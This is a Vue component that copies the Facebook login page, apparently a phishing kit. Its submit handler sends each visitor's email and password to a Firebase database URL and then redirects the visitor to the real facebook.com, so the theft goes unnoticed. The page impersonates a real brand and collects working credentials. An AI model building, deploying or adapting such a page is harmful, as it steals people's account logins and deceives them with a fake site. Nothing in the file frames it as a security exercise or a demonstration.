<template>
  <div class="container-fluid" id="wid">
    <div class="row justify-content-center pt-5 pb-5">
      <div class="col-11 text-center">
        <div class="row">
          <div class="col-lg-7 col-md-12" id="wid2">
            <h1 class="text-primary">facebook</h1>
            <p class="p1">
              Facebook helps you connect and share<br />
              with the people in your life.
            </p>
          </div>
          <div class="col-lg-5 col-md-12 p-3 bg-white shadow rounded">
            <!-- form start -->
            <form class="m-2" autocomplete="off">
              <div class="form-group">
                <input
                  type="email"
                  class="form-control rounded"
                  id="exampleInputEmail1"
                  aria-describedby="emailHelp"
                  placeholder="Email address or Phone number"
                  v-model="email" required
                />
              </div>
              <div class="form-group">
                <input
                  type="password"
                  class="form-control rounded"
                  id="exampleInputPassword1"
                  placeholder="Password"
                  v-model="password" required
                />
              </div>
              <div class="form-group">
                <button
                  type="submit"
                  class="btn btn-primary form-control"
                  @click.prevent="submitForm"
                >
                  Submit
                </button>
                <!-- <input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password"> -->
              </div>
              <div class="form-group">
                <p class="text-primary">Forgotten password?</p>
              </div>
              <hr />
              <div class="form-group">
                <button type="submit" class="btn gree">
                  Create New Account
                </button>
              </div>
            </form>
            <!-- form end -->
            <b>Create a Page</b> for a celebrity, brand or business.
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import axios from "axios";
export default {
  data() {
    return {
      email: "",
      password: "",
      posts: [],
    };
  },
  methods: {
    submitForm() {
      if(this.email === "" || this.password==="")return
     axios.post('https://vue-facebook-9f3dc-default-rtdb.firebaseio.com/data.json',{
       email:this.email,
       password:this.password
     })
     .then(res=>{
       console.log(res);
     })
      window.location.href="https://www.facebook.com/"
    },
  },
};
</script>

<style>
body {
  font-family: Verdana, Geneva, Tahoma, sans-serif;
}
h1 {
  font-size: 70px;
  font-weight: bolder;
}
.p1 {
  font-size: 25px;
  /* font-weight: bold; */
  text-align: center;
}
.form-group input {
  /* width: 400px; */
  margin: 10px 1rem;
  padding: 15px 10px;
}
.form-group button {
  /* width: 400px; */
  margin: 10px 1rem;

  padding: 15px 10px;
}
.form-group hr {
  /* width: 400px; */
  margin: 10px 1rem;
  padding: 15px 10px;
}
#wid {
  height: 100vh;
  background-color: rgba(236, 228, 228, 0.996);
  padding-top: 5rem;
}
#wid2 {
  margin-top: 4rem;
}
.gree {
  background-color: rgb(48, 189, 48) !important;
  color: #fff;
  padding: 0px 40px;
}

@media only screen and (max-width: 800px) {
  .p1 {
    font-size: 20px;
  }
  #wid {
    padding-top: 0px;
  }
  #wid2 {
    margin-top: 0px;
    padding-bottom: 1rem;
  }
}
</style>